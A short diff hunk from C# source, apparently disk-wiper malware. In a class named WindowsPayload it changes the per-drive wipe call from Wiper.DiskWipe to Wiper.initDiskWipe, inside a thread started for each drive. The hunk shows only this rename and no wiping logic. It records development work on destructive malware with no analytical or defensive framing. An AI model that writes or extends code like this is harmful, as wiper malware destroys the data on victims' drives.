@@ -79,7 +79,7 @@ public class WindowsPayload
     {
         Thread temp = new Thread(() =>
         {
-            Wiper.DiskWipe(drive.Name);
+            Wiper.initDiskWipe(drive.Name);
         });
         temp.Start();
 
